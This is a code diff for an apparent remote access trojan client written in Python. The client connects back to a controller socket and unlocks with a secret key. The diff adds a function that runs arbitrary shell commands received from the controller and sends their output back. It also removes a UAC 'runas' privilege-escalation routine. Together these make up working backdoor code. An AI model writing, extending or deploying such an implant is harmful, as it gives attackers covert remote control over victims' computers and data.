@@ -9,6 +9,7 @@ import os
 import platform
 import ctypes
 import threading
+import subprocess
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -120,21 +121,21 @@ def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
     sock.sendall(str(message)+end)
 
 
-def uac_escalation(argv=None, debug=False):
-    if argv is None and Shell32.IsUserAnAdmin():
-        return True
-    if argv is None:
-        argv = sys.argv
-    if hasattr(sys, '_MEIPASS'):
-        arguments = map(unicode, argv[1:])
+###
+# FUNCTIONS
+###
+def run_shell(cmde):
+    if cmde:
+        try:
+            execproc = subprocess.Popen(cmde, shell=True,
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
+            return cmdoutput
+        except Exception as e:
+            return str(e)
+
     else:
-        arguments = map(unicode, argv)
-    argument_line = u' '.join(arguments)
-    executable = unicode(sys.executable)
-    ret = Shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
-    if int(ret) <= 32:
-        return False
-    return None
+        return "Enter a command.\n"
 
 
 def send_info(sock):
@@ -187,11 +188,7 @@ def reactor():
                         except socket.error:
                             break
 
-                        # Run As Administrator Privileges
-                        if data['payload'] == 'runAsAdmin':
-                            uac_escalation()
-
-                        elif data['payload'].startswith('unlockClient '):
+                        if data['payload'].startswith('unlockClient '):
                             pass_key = data['payload'].split()[-1]
                             if pass_key == SECRET:
                                 UNLOCKED = True
@@ -206,6 +203,9 @@ def reactor():
                                         if data['payload'] == 'lockClient':
                                             UNLOCKED = False
 
+                                        else:
+                                            data_send(server_socket, run_shell(data['payload']), 'shellMode', session_id=data['session_id'])
+
                                     except socket.error:
                                         break
 
@@ -216,6 +216,9 @@ def reactor():
                         else:
                             data_send(server_socket, 'notAuthorized', 'notAuthorized')
                             continue
+
+                else:
+                    pass
 
             except socket.error:
                 server_socket.close()
